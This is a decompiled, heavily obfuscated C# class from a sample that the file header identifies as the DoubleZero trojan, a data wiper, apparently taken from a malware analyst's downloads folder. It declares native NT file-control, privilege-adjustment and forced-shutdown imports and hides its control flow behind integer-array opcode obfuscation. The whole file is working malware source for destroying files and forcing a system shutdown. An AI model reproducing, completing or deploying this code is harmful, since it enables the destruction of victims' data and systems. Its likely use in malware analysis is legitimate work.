// Decompiled with JetBrains decompiler
// Type: _d3c219d6ed3b8b60ㆵ꼕占._9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑
// Assembly: CSRSS, Version=10.0.19041.546, Culture=neutral, PublicKeyToken=null
// MVID: AFC04DB3-E8A2-4611-8930-D89462AA5E9D
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan.MSIL.DoubleZero.gen-30b3cbe8817ed75d8221059e4be35d5624bd6b5dc921d4991a7adc4c3eb5de4a.exe

using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace _d3c219d6ed3b8b60ㆵ꼕占
{
  public static class _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑
  {
    private const string _9afca341083800c2酖딜줱㶈뵽ⱞ뼛᪆ꝉ櫩쮢꽦Ⴅ닓咪텼反開鸙쟄ꍱ䮨鿔ಥ惨甞뗎쬥揖蜩ꢛ읏磹쿳껼媟亍蕄袣謊蜊磁嘐芪 = "ntdll.dll";
    private const string _3db2e4afc887e04fဉ繹ꧡ驸씻邥剟䣯篎䔤惗ᴇ셇멬憄奎텷ꔣ㩾麼ט侒ⶶԊ힌 = "kernel32.dll";
    private const string _083f29baa16872d2갊ᐴᴝ姞䖯퍤㡔罡垒퐦ብ䦇簜퐅灴霺ﰡꏓ杊䝝櫇ꨞ䉉䳦錕놏㙲셯竛늹机ꑱ = "user32.dll";

    [DllImport("ntdll.dll")]
    public static extern uint NtOpenFile(
      out SafeFileHandle _ebe52bb204efeadf꺱又ㅛᆗ㷥ꦲᎁᯅ턫쌑ᴷ齢癑ꠑ澞똡黿큮ሿ糫ᐮ垐㡟ᶝ䮗,
      ulong _ada415a8886f069d乜ⴹꐱ㟚탅䏱ᰞ謸髞䬉䚛ﳵ뫗ꊾట睲䊬팾陕鷷ᬧ圉婾쏜眅䜸娩,
      ref _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑._c0aa91fe1d1aa494ᙠ㗝냏瞶힟鸃汋儷鞾䄯ﻦ褱ትퟤ䔈黡픣牑ɡ㣏ښ跶㔲ₜ雯뺋禛䪐菬筱 _fa04305cbf5c2dc2琢灆㙈ڹ랭逇甪틦攇둻쿎쟣費좚ጴ㽴衠ꄪₚ当畊谖Ứ䊢珠褝睇퓕,
      ref _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑._96f8b72c402ec510遛韄嚅휦쉐춯㝝챊㑠Ѷ쒽眭ꅥ雟犤㲻늇ᕡ뾒눁죆얣鼊쫬ດ褔 _54a6ae48cb46ed65뿻鱑ꊑ잓簁ⶁ䗁ἐ䆳㻼䎪䢔ᮍᯈ毽ң깂ᥭ䈥䪝㗪咡뎇ⲯ塞ポ얎宬턨螯䝪ㆴ緖㢵芍Ⱀ䙁Î,
      ulong _0dcad2772c6458aa놅뼋ᛞ懗紭,
      ulong _687a51e2c6fd263aⲬ挍禫齃㼲ꍉ矢偌ꌽ題葿좛诰첽揾䨳쟡㱄門픔ᝀꛒ툳蚃嘣뗛귲Ă湫楝ስ큋佾䒊쇣귫攇鞛괠숒굔셩롅);

    [DllImport("ntdll.dll")]
    public static extern uint NtFsControlFile(
      SafeFileHandle _ebe52bb204efeadfﴅ䗪闎᥆ꎍ耭풬쯰ꣽ薛뫗曠湛킩撔朢퓽睡뽢唩贔醵鉂抏,
      IntPtr _214791883540ad25鎔싷䤠,
      IntPtr _985ba3a449f0accb댿䋩䜃췆潲衵ឋ㣨骏叄쯀爲㟳䆜ꖄ板琧墵營乻,
      IntPtr _55e1481b4e094c45쪖优ʈ籁챓拿輤亲ऽᝍ骷ꓔ砤퐛巜貮皜,
      ref _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑._96f8b72c402ec510遛韄嚅휦쉐춯㝝챊㑠Ѷ쒽眭ꅥ雟犤㲻늇ᕡ뾒눁죆얣鼊쫬ດ褔 _54a6ae48cb46ed65慙咥䤚厒㻆턣쁸灊歃쪯殮赙噓樼濾ᔛ옪톜䓻檩股䂟睱적鑕䎬䧤ꬭ魌䬃抬롒ﲁ姌ᢁ흗ℹ逩ឥᖳ饊甭픾ꈡ厢澇뉰,
      ulong _c8ad6f14d0f3a5d0ꮴ橕ᔽ槂拜ጂ瓮㮚몶廥驰羚,
      IntPtr _091eecec16b719c9ᾉ늀㬟脧㭩迏ﭜ妶ƚ햒伦솓㚕껡ቸ䣢닻趃㿷漇ﴵｌ䰠㴒홬溚켙쉠춘㟋꿎팺ὁ,
      ulong _5b6d85e0d0399c0c萞ꁙ땉㯺ナ봺뗪쾻ꨣ牄럀薰䜧嘇楻퀹హ껣疢,
      IntPtr _3dd7f0e0a3562b64ꈅℙ缺ﴃ蠼ꨏ鸷ぼ榟쇹䃮奮겤꽯䎞懫煥远疔悉隟ጘ䶂랧挞槡,
      ulong _eac0ed53558e1fc3鈷爉ﱖἺŬ皼裝鹉湶㰞);

    [DllImport("ntdll.dll")]
    public static extern ulong RtlNtStatusToDosError(
      ulong _45a32e1191788199輻晋㟝鯲罀옶䰶睷룜疃ᬱఌ矸溄剳έ즛闖샑ꖃ醕㦄脡ጏ鱅汀괒䀃쀳㲢ᘣ담䂬鞫Ģᚙ䎌弄);

    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(
      ulong _fa3ef4e114b711db攗葌줩躇ꨑ耙橹簍鴉ꖍ憣鳄ඦ謧犆㺂烠슬ᢴﾀᴎ㑍ፆ铅锔暭,
      bool _48aff8490d34409f뾏뷎淣䋠쨸컭ᯉ瓟㯲ꚃ虹뙖芍䳵춴,
      bool _8d6d0deaeba2428c癡瞴筛ই,
      ref bool _7a2c4547b5127da3ꯟ瑓虧䕈も練火䮩砙䴾);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(
      IntPtr _0b7a369c11d0753d崓䌣衬鯀䩏絧瓭궧펊Ⲁ冽琑쟩ᎍ蓍ꭅ㷷ቮ豸㠻㓢恋ⶣᶬ抠쓽ﲎ늊폭颦䐕齖珙贆牧媔ꀰ䫎밖홻ϰ궅ᡍᚅ獙À);

    [DllImport("kernel32.dll")]
    public static extern bool GetFileSizeEx(
      SafeFileHandle _90e1fea45946d651㣳覇䡈䵔䁀줢Ὓ봼ﮞᣋ瓎咔挞翏ꀏ뜻合쫞趚u吇邔䕣ໜ킪䟾鍾㕴攨俰ಷ雪,
      out ulong _b8b922de9dcf9d00䇘뵐䇝ꓬ晻Ԉ똄廖꾚疟䥿䙡퐆爝濐妈폌땇);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("user32.dll")]
    private static extern bool ExitWindowsEx(
      uint _85704f1e4fc20a72썀9捭菛彎㼻婶헃仉,
      int _7eebb7cfaca9b3c4焹ꎨๅ뭦쾶㰦ꀫ礲ᡟ쬏윉띧須臮㘟嗢뭗ﭹ뎭㻗릸滞砫쎢덻払밶劚쁚聮ጘኜ聠搞垆꾣䂮棇ו儡굑뷘썟잺叅የ);

    public static string _77877537145b99f7䈂쑬䔭㗠㴙Ｗ櫵퍏嬋篿櫟䶣ꃴ䏂䏺䥲掿剨樼錴ꬻ䱶Ǣ썊뻔ꈦ燬렛咰ؼ艚蘑巀(
      ulong _b46b772bdf61732c뼀棦捫憯巓㵀ᜉ㦫ͷ䙽㷚ದ蚅嶻棛陙蚥)
    {
      return new Win32Exception((int) _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑.RtlNtStatusToDosError(_b46b772bdf61732c뼀棦捫憯巓㵀ᜉ㦫ͷ䙽㷚ದ蚅嶻棛陙蚥)).ToString();
    }

    public static void _6f46f6a166af4a4d啄ᛴ䘦粃뢼ꑞﬥ凙ᜬ䞅딵ﻪ쿌蚧쿹郘ⶇ祶ﯴᤞ퓥팍쌋徯哗皙()
    {
      int index = 0;
      object[] objArray = new object[5]
      {
        (object) new int[12]
        {
          90,
          2146115014,
          90,
          1859121167,
          20,
          90,
          225101174,
          10,
          90,
          512094897,
          20,
          180
        },
        (object) new int[12]
        {
          90,
          2146114917,
          90,
          1859121167,
          20,
          90,
          225101174,
          10,
          90,
          512094897,
          20,
          180
        },
        (object) new int[6]
        {
          90,
          512094982,
          90,
          512094897,
          20,
          180
        },
        (object) new int[6]
        {
          90,
          512094962,
          90,
          512094897,
          20,
          180
        },
        (object) new int[6]
        {
          90,
          512095087,
          90,
          512094897,
          20,
          180
        }
      };
      for (; index < 5; ++index)
      {
        switch (aJyNcp7DcdX5Ri.fy2gyGskMp((int[]) objArray[index], 0, 0))
        {
          case 65:
            _9f6717951b3535fb甸㯙ਇ喽쎡㽁瓶颣럻엥숁拐ⴒ㧲ꤙ梟ꅜ梣誥ࡒ푮浏뢽蠪絰헽뤶쭎컅츮昑.ExitWindowsEx((uint) aJyNcp7DcdX5Ri.fy2gyGskMp(new int[13]
            {
              90,
              586969976,
              190,
              210,
              220,
              90,
              586969976,
              190,
              200,
              220,
              240,
              230,
              180
            }, 0, 0), aJyNcp7DcdX5Ri.fy2gyGskMp(new int[13]
            {
              90,
              586969976,
              90,
              586969976,
              190,
              210,
              220,
              190,
              210,
              220,
              270,
              230,
              180
            }, 0, 0));
            break;
        }
      }
    }

    public struct _96f8b72c402ec510遛韄嚅휦쉐춯㝝챊㑠Ѷ쒽眭ꅥ雟犤㲻늇ᕡ뾒눁죆얣鼊쫬ດ褔
    {
      public uint _c2a5e95505f4d0d7贲徸䔺쑃䋕孇㬮抠镈눫丫큧ᙡ;
      public IntPtr _c76d1abe0388a5b8韟뛃趌䬉ˍ剨烚筦논ᡶ冚狇ꉄ飫ꧼ혻椛칂剠騧薨薶첨㞴髂㜏脷侲뫞桛綁㙘끾ﵱ䧁ᘭᧁ;
    }

    public struct _d8463bec0a849d38刟륔ᩄ设㒶诎귚鑟綿閚鲎戵嵪霫殓䛋᭑잜焂诃쏥꺳㱒鸉扆覩㘡鿋ꏜ橔饘 : IDisposable
    {
      public ushort _77a5ed74d507e67f균잦À삤珛흺댛蝣첹縬Ҫ镋㜫थ㭀窪帏끈㞘㿰霢ᑆ㭢胭闝橪䒢蚊烖ዏ츯ᵺ龎랢釗獆雪衱낼ㄒỐ;
      public ushort _44beaf781f75be9c鲌廝ꬓ芃興尠榒雴崯팺䶜璒䙵麗ꖎ痺䎢ဤ긁䕫Ⳅ샸赿춎餉嵕櫵ꎡ셁댟ｔչᠷ꿒朔멐떂ᵨ엣왎㠢띤;
      public IntPtr _86cb9ded1cb33a40曆빺繖訇탁ꮕ㰙忹ꕫ挥쟁낔뭤껠묯웼㿝캬ꅷ떃螒펭䥟摍瑮勷쪟鷺ὺ㰹씵ᒖ堞㒛;

      public _d8463bec0a849d38刟륔ᩄ设㒶诎귚鑟綿閚鲎戵嵪霫殓䛋᭑잜焂诃쏥꺳㱒鸉扆覩㘡鿋ꏜ橔饘(
        string _7898ec674c2b231e诧㞑ﭵ㞲ꤌ큿窵郗隻犼혃뽛銔㙃喾쟜持垂ᮏ踲䅢ₘ氎莨彝෭G潴Ḻ觙㙕룍ꮺ戦补ஏ냷騭㪇㨤敪ᶠ)
      {
        this._77a5ed74d507e67f균잦À삤珛흺댛蝣첹縬Ҫ镋㜫थ㭀窪帏끈㞘㿰霢ᑆ㭢胭闝橪䒢蚊烖ዏ츯ᵺ龎랢釗獆雪衱낼ㄒỐ = (ushort) (_7898ec674c2b231e诧㞑ﭵ㞲ꤌ큿窵郗隻犼혃뽛銔㙃喾쟜持垂ᮏ踲䅢ₘ氎莨彝෭G潴Ḻ觙㙕룍ꮺ戦补ஏ냷騭㪇㨤敪ᶠ.Length * aJyNcp7DcdX5Ri.fy2gyGskMp(new int[25]
        {
          90,
          586969976,
          190,
          210,
          220,
          90,
          586969976,
          190,
          200,
          220,
          240,
          90,
          493215177,
          190,
          210,
          220,
          90,
          493215177,
          190,
          200,
          220,
          240,
          240,
          230,
          180
        }, 0, 0));
        this._44beaf781f75be9c鲌廝ꬓ芃興尠榒雴崯팺䶜璒䙵麗ꖎ痺䎢ဤ긁䕫Ⳅ샸赿춎餉嵕櫵ꎡ셁댟ｔչᠷ꿒朔멐떂ᵨ엣왎㠢띤 = (ushort) ((int) this._77a5ed74d507e67f균잦À삤珛흺댛蝣첹縬Ҫ镋㜫थ㭀窪帏끈㞘㿰霢ᑆ㭢胭闝橪䒢蚊烖ዏ츯ᵺ龎랢釗獆雪衱낼ㄒỐ + aJyNcp7DcdX5Ri.fy2gyGskMp(new int[25]
        {
          90,
          586969976,
          190,
          210,
          220,
          90,
          586969976,
          190,
          200,
          220,
          240,
          90,
          493215177,
          190,
          210,
          220,
          90,
          493215177,
          190,
          200,
          220,
          240,
          240,
          230,
          180
        }, 0, 0));
        this._86cb9ded1cb33a40曆빺繖訇탁ꮕ㰙忹ꕫ挥쟁낔뭤껠묯웼㿝캬ꅷ떃螒펭䥟摍瑮勷쪟鷺ὺ㰹씵ᒖ堞㒛 = Marshal.StringToHGlobalUni(_7898ec674c2b231e诧㞑ﭵ㞲ꤌ큿窵郗隻犼혃뽛銔㙃喾쟜持垂ᮏ踲䅢ₘ氎莨彝෭G潴Ḻ觙㙕룍ꮺ戦补ஏ냷騭㪇㨤敪ᶠ);
      }

      public void Dispose()
      {
        int index = 0;
        object[] objArray = new object[7]
        {
          (object) new int[6]
          {
            90,
            512094988,
            90,
            512094897,
            20,
            180
          },
          (object) new int[12]
          {
            90,
            2146115063,
            90,
            1859121167,
            20,
            90,
            225101174,
            10,
            90,
            512094897,
            20,
            180
          },
          (object) new int[6]
          {
            90,
            512095047,
            90,
            512094897,
            20,
            180
          },
          (object) new int[6]
          {
            90,
            512095145,
            90,
            512094897,
            20,
            180
          },
          (object) new int[9]
          {
            90,
            286993965,
            90,
            225101174,
            10,
            90,
            512094897,
            20,
            180
          },
          (object) new int[6]
          {
            90,
            512095164,
            90,
            512094897,
            20,
            180
          },
          (object) new int[9]
          {
            90,
            286993940,
            90,
            225101174,
            10,
            90,
            512094897,
            20,
            180
          }
        };
        for (; index < 7; ++index)
        {
          switch (aJyNcp7DcdX5Ri.fy2gyGskMp((int[]) objArray[index], 0, 0))
          {
            case 248:
              Marshal.FreeHGlobal(this._86cb9ded1cb33a40曆빺繖訇탁ꮕ㰙忹ꕫ挥쟁낔뭤껠묯웼㿝캬ꅷ떃螒펭䥟摍瑮勷쪟鷺ὺ㰹씵ᒖ堞㒛);
              break;
            case 267:
              this._86cb9ded1cb33a40曆빺繖訇탁ꮕ㰙忹ꕫ挥쟁낔뭤껠묯웼㿝캬ꅷ떃螒펭䥟摍瑮勷쪟鷺ὺ㰹씵ᒖ堞㒛 = IntPtr.Zero;
              break;
          }
        }
      }

      public override string ToString() => Marshal.PtrToStringUni(this._86cb9ded1cb33a40曆빺繖訇탁ꮕ㰙忹ꕫ挥쟁낔뭤껠묯웼㿝캬ꅷ떃螒펭䥟摍瑮勷쪟鷺ὺ㰹씵ᒖ堞㒛);
    }

    public struct _c0aa91fe1d1aa494ᙠ㗝냏瞶힟鸃汋儷鞾䄯ﻦ褱ትퟤ䔈黡픣牑ɡ㣏ښ跶㔲ₜ雯뺋禛䪐菬筱
    {
      public ulong _77a5ed74d507e67f熚龣㔱개걈泚瀛ꡞᾎ㙰鮛贝㷾甯ꕨ뼮ꏒ죂磔추醞嘾謁跀矄ī飦빈㐾㾑㲛ꩣ㝶撃葋윏컪䛢皌;
      public IntPtr _fbe8db34ff6bedb4縬ꜝ쨰ͽ忕ř풶霐콸７덵徚ሖ;
      public IntPtr _8d9252b64a539998䆴㚆ꐁ苮䴳ꮊ녵轔踛칌흗킠烑띇칦붺췅矰歚䚃梌죌榏훯䤔盫ဩɖ;
      public ulong _8a21e95d9718715f㓢槧뫍鵥螓㶮森㰒攡휱꩐禇챚ㄙ塚ල沷蚮㢙ꛄᨵᙥ咪퇁뵀㷽嚴꩓겸唃됓ꀂ꾟ꂭ瑣綉㞴䰕욿鉳纜骂臉;
      public IntPtr _84e1c3cf2161354d鸝꩘禴낓涫칦먩춾즈剐몕ᆝᾚ욍뿵擀쓆鮭洦៤㹇෭ꢦ䒱驼;
      public IntPtr _634f8cfcc29854bf즀㮁鵰膣䊹淡菵돫䱿ᯗ鿆莢嘼믓硛쏖똠癴얿槃桋仳;
    }

    public struct _2c843e7eceb66574笤굾쁰䢆熫嬣閅Ǝ倬Ḗ혫ڷ鞃䤩愊ᚡ旘結婈鋩
    {
      public ulong _e3d0a55368e6fff9ꁖ婈惥軔蹩堼䬣䰠岽䯣ᐃ鎲꽠㵶돵怔䀻ᮛ燬鉶ᦪ欍濛嶓뛭빚鎈渻朧礋짴ᕏ霼駲롹汚;
      public ulong _9ce584cfe930eb3b键샄В斌궙탱삐쥴柛쟳ኽ誖Ꙥ䁽欆엞ò駁傓쟯Ѽ랸꿟;
    }
  }
}
